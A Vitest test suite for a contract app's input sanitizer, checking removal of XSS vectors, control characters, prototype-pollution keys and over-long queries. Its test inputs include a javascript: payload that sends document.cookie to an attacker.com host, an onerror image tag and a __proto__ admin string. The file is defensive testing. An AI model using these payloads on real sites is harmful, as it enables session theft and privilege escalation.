import { describe, it, expect } from 'vitest';
import {
  sanitizeInput,
  sanitizeLegalText,
  sanitizeQuery,
  validateContractPayload
} from './security';

describe('Security & Sanitization Suite - XSS Defense', () => {
  it('strips script tags and their content from text input', () => {
    const malicious = 'Lease Agreement <script>alert("xss")</script>';
    const cleaned = sanitizeInput(malicious);
    expect(cleaned).toBe('Lease Agreement');
    expect(cleaned).not.toContain('<script>');
    expect(cleaned).not.toContain('alert');
  });

  it('neutralizes inline event handlers like onerror and onload', () => {
    const malicious = '<img src=x onerror="alert(1)"> Tenant Contract';
    const cleaned = sanitizeInput(malicious);
    expect(cleaned).toBe('Tenant Contract');
    expect(cleaned).not.toContain('onerror');
  });

  it('strips javascript: pseudo-protocols', () => {
    const malicious = 'javascript:fetch("https://attacker.com/steal?data=" + document.cookie)';
    const cleaned = sanitizeInput(malicious);
    expect(cleaned).not.toContain('javascript:');
  });

  it('strips null bytes and control characters', () => {
    const payload = 'Contract\x00Title\x1F\x08With\x0BNulls';
    const cleaned = sanitizeInput(payload);
    expect(cleaned).toBe('ContractTitleWithNulls');
  });

  it('neutralizes prototype pollution vectors', () => {
    const payload = '{"__proto__": {"admin": true}}';
    const cleaned = sanitizeInput(payload);
    expect(cleaned).not.toContain('__proto__');
  });
});

describe('Security & Sanitization Suite - Legal Text & Payload Validation', () => {
  it('preserves valid contract punctuation and numbering while stripping HTML', () => {
    const contract = `<b>Section 1.1</b> The Tenant shall pay Rs. 25,000/- monthly.
<i>Section 1.2</i> Late fee is 12% per annum.`;
    const cleaned = sanitizeLegalText(contract);

    expect(cleaned).toContain('Section 1.1 The Tenant shall pay Rs. 25,000/- monthly.');
    expect(cleaned).toContain('Section 1.2 Late fee is 12% per annum.');
    expect(cleaned).not.toContain('<b>');
    expect(cleaned).not.toContain('<i>');
  });

  it('rejects empty or whitespace-only contract payloads', () => {
    const validation = validateContractPayload('    \n\n  ');
    expect(validation.isValid).toBe(false);
    expect(validation.errorMessage).toContain('empty');
  });

  it('rejects contracts with insufficient content under 30 characters', () => {
    const validation = validateContractPayload('Too short');
    expect(validation.isValid).toBe(false);
    expect(validation.errorMessage).toContain('minimum 30 characters');
  });

  it('accepts and sanitizes valid contract payloads', () => {
    const raw = `Section 1. Term of Lease
This lease shall commence on the first day of October and run for eleven months.
Section 2. Rent and Payment
Rent is payable in advance on the first of each month.`;

    const validation = validateContractPayload(raw, '<b>Standard Lease</b>');
    expect(validation.isValid).toBe(true);
    expect(validation.cleanTitle).toBe('Standard Lease');
    expect(validation.cleanText).toContain('Section 1. Term of Lease');
  });

  it('enforces query length caps to prevent query-based buffer overflows', () => {
    const hugeQuery = 'a'.repeat(2000);
    const cleaned = sanitizeQuery(hugeQuery);
    expect(cleaned.length).toBeLessThanOrEqual(1000);
  });
});
